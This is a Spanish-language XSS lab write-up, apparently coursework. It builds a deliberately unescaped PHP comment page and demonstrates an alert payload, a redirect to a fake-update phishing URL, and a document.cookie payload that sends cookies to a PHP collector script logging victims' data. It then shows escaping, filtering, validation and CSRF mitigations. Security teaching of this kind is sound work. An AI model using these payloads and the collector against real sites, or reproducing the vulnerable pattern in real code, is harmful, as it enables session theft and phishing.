# Actividad: Cross-Site Scripting (XSS)

---

## 1. Preparación del entorno

Lo primero es dirigirme a la ubicación en la que en el ejercicio anterior creé toda la infraestructura con la herramienta docker. En mi caso:

```bash
cd ~/Unidad3/CreacionEntornoPruebas/docker-compose-lamp
```

Una vez aquí me iré al directorio `/www`:

```bash
cd www
```

---

## 2. Creación de la aplicación vulnerable

Creo un fichero llamado `comment.php` donde pondré el código vulnerable:

```bash
nano comment.php
```

![Ubicación y crear archivo](/imagenes/img1.png)

Dentro del archivo inserto lo siguiente:

```php
<?php
// Activar errores en entorno de prácticas (opcional)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$comment = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // SIN SEGURIDAD: se guarda el comentario tal cual
    $comment = $_POST['comment'] ?? '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios INSEGUROS</title>
</head>
<body>
    <h1>Comentarios (versión insegura)</h1>

    <form method="post">
        <label for="comment">Comentario:</label><br>
        <!-- SIN htmlspecialchars: se muestra el contenido sin escapar -->
        <textarea name="comment" id="comment" rows="4" cols="50"><?= $comment ?></textarea><br>
        <button type="submit">Enviar</button>
    </form>

    <?php if ($comment !== ''): ?>
        <h2>Comentario recibido (SIN sanitizar)</h2>
        <!-- Aquí también se imprime directamente, vulnerable a XSS -->
        <p><?= $comment ?></p>
    <?php endif; ?>
</body>
</html>
```

![Contenido vulnerabilidad](/imagenes/img2.png)

---

## 3. Acceso a la aplicación

En un navegador de la máquina virtual, busco la siguiente URL:

```
http://localhost/comment.php
```

Pongo un comentario cualquiera para comprobar el funcionamiento:

![Contenido vulnerabilidad](/imagenes/img3.png)

---

## 4. Explotación de la vulnerabilidad

### Explotación 1

Pongo el siguiente comentario:

```
<script>alert('XSS ejecutado!')</script>
```

Aparece un mensaje de alerta, indicando que la aplicación es vulnerable:

![Explotación 1](/imagenes/img4.png)

### Explotación 2

Redirijo a una página de phishing con este comentario:

```
<script>window.location='https://fakeupdate.net/win11/'</script>
```

![Comentario](/imagenes/img5.png)

La página que se abre según envío el exploit:

![Redirección](/imagenes/img6.png)

---

## 5. Preparación del servidor atacante

Creo la estructura del servidor atacante:

```bash
mkdir ./www/cookieStealer/
touch ./www/cookieStealer/index.php
touch ./www/cookieStealer/cookies.txt
chmod 777 ./www/cookieStealer/cookies.txt
```

![cmd](/imagenes/img7.png)

---

## 6. Script del servidor atacante

En `./www/cookieStealer/index.php` inserto:

```php
<?php
// Obtener la fecha actual
$date = date("Y/m/d H:i:s");

// Obtener la dirección IP, User Agent y Referer
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'No User Agent';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';

// Obtener el parámetro 'cookie' de la URL
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No Cookie Provided';

// Escapar las variables para evitar inyecciones de código
$cookie = htmlspecialchars($cookie, ENT_QUOTES, 'UTF-8');
$user_agent = htmlspecialchars($user_agent, ENT_QUOTES, 'UTF-8');
$referer = htmlspecialchars($referer, ENT_QUOTES, 'UTF-8');

// Intentar abrir el archivo de registro
$file = fopen("cookies.txt", "a");

if ($file === false) {
    echo json_encode(["status" => 500, "message" => "Error opening file"]);
    exit();
}

// Escribir la información en el archivo
fwrite($file, "[+] Date: {$date}\n[+] IP: {$ip}\n[+] UserAgent: {$user_agent}\n[+] Referer: {$referer}\n[+] Cookies: {$cookie}\n---\n");

// Cerrar el archivo
fclose($file);

// Responder con un JSON de éxito
echo json_encode(["status" => 200]);
?>
```

![Código malicioso](/imagenes/img8.png)

---

## 7. Robo de cookies

En la web pongo como comentario:

```
<script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>
```

![Script malicioso](/imagenes/img9.png)

Los datos de la cookie se guardan en `cookies.txt`:

```bash
cd /www/cookieStealer
cat cookies.txt
```

![Archivo cookies.txt](/imagenes/img10.png)

---

## 8. Mitigación

Creo el archivo `comment1.php` y añado:

```php
<?php
// Activar errores en entorno de prácticas
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function filter_string_polyfill(string $string): string
{
    // Elimina caracteres nulos y etiquetas HTML
    $str = preg_replace('/\x00|<[^>]*>?/', '', $string);
    // Sustituye comillas por entidades HTML
    return str_replace(["'", '"'], ['&#39;', '&#34;'], $str);
}

$comment = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener el comentario enviado (o cadena vacía si no existe)
    $raw = $_POST['comment'] ?? '';
    // Sanitizarlo
    $comment = filter_string_polyfill($raw);
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios seguros</title>
</head>
<body>
    <form method="post">
        <label for="comment">Comentario:</label><br>
        <textarea name="comment" id="comment" rows="4" cols="50"><?= htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></textarea><br>
        <button type="submit">Enviar</button>
    </form>

    <?php if ($comment !== ''): ?>
        <h2>Comentario recibido (sanitizado)</h2>
        <p><?= htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></p>
    <?php endif; ?>
</body>
</html>
```

![Script mitigacion](/imagenes/img11.png)

---

## 9. Sanitización con htmlspecialchars()

Creo `comment2.php` con:

```php
<?php
// Mostrar errores en entorno de prácticas
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$comment = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recogemos el comentario crudo del formulario
    $comment = $_POST['comment'] ?? '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios seguros</title>
</head>
<body>
    <h1>Comentarios (versión con htmlspecialchars)</h1>

    <form method="post">
        <label for="comment">Comentario:</label><br>
        <textarea name="comment" id="comment" rows="4" cols="50">
<?= htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>
        </textarea><br>
        <button type="submit">Enviar</button>
    </form>

    <?php if ($comment !== ''): ?>
        <h2>Comentario recibido (escapado)</h2>
        <p><?= htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></p>
    <?php endif; ?>
</body>
</html>
```

![script sanitizacion](/imagenes/img12.png)

---

## 10. Validación de entrada

Creo `comment3.php` con validaciones:

```php
<?php
// Mostrar errores en entorno de prácticas
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$comment = '';
$error   = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'] ?? '';
    $comment = trim($comment); // opcional, para no aceptar solo espacios

    $length = mb_strlen($comment, 'UTF-8');

    if ($length === 0) {
        $error = 'El comentario no puede estar vacío.';
    } elseif ($length > 500) {
        $error = 'El comentario no puede tener más de 500 caracteres.';
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios (comment3, con validación)</title>
</head>
<body>
    <h1>Comentarios (comment3, con validación)</h1>

    <?php if ($error !== ''): ?>
        <p style="color: red;">
            <?= htmlspecialchars($error, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>
        </p>
    <?php endif; ?>

    <form method="post">
        <label for="comment">Comentario:</label><br>
        <textarea name="comment" id="comment" rows="4" cols="50">
<?= htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>
        </textarea><br>
        <button type="submit">Enviar</button>
    </form>

    <?php if ($error === '' && $comment !== ''): ?>
        <h2>Comentario recibido</h2>
        <p><?= htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></p>
    <?php endif; ?>
</body>
</html>
```

![script sanitizacion](/imagenes/img13.png)

---

## 11. Código seguro final

Creo `comment4.php` con todas las mitigaciones:

```php
<?php
// Mostrar errores en entorno de prácticas
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Función de filtrado original
function filter_string_polyfill(string $string): string
{
    $str = preg_replace('/\x00|<[^>]*>?/', '', $string);
    return str_replace(["'", '"'], ['&#39;', '&#34;'], $str);
}

session_start();

// Generar token CSRF si no existe
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$comment = '';
$error   = '';
$success = '';

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Verificar el token CSRF
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $error = "Error: Token CSRF inválido.";
    } else {
        $comment = $_POST['comment'] ?? '';
        $comment = filter_string_polyfill($comment);
        $comment = htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

        $length = mb_strlen($comment, 'UTF-8');

        if ($length === 0) {
            $error = "El comentario no puede estar vacío.";
        } elseif ($length > 500) {
            $error = "El comentario no puede tener más de 500 caracteres.";
        } else {
            $success = "Comentario publicado:";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Comentarios seguros (comment4)</title>
</head>
<body>
    <h1>Comentarios (comment4, con CSRF y filtro)</h1>

    <?php if ($error !== ''): ?>
        <p style="color: red;">
            <?= htmlspecialchars($error, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>
        </p>
    <?php endif; ?>

    <?php if ($success !== '' && $comment !== ''): ?>
        <p style="color: green;">
            <?= htmlspecialchars($success, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>
        </p>
    <?php endif; ?>

    <form method="post">
        <label for="comment">Comentario:</label><br>
        <textarea name="comment" id="comment" rows="4" cols="50">
<?= $comment ?>
        </textarea><br>

        <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>">

        <button type="submit">Enviar</button>
    </form>

    <?php if ($success !== '' && $comment !== ''): ?>
        <h2>Comentario recibido</h2>
        <p><?= $comment ?></p>
    <?php endif; ?>
</body>
</html>
```

![Código seguro](/imagenes/img14.png)

---

## 12. Guardar los cambios

```bash
sudo ./guardarConfiguraciones.sh XSS
sudo ./restaurarConfiguracionOriginal.sh
```

Los archivos creados se guardarán en `./www/XSS`.

Para detener el entorno de pruebas:

```bash
docker compose stop
```

---

## Conclusiones

La vulnerabilidad **XSS reflejada** permite ejecutar código JavaScript arbitrario en el navegador de la víctima si no se sanitiza correctamente la entrada del usuario.

Principales defensas:

- Uso de `htmlspecialchars()` con `ENT_QUOTES`
- Validación estricta de entrada (longitud y contenido)
- Uso de tokens CSRF
- Filtrado de etiquetas sospechosas

En producción se recomienda usar **Content Security Policy (CSP)** y frameworks que escapen automáticamente la salida.

Esta práctica demuestra la importancia de **no mostrar nunca datos proporcionados por el usuario directamente sin protección**.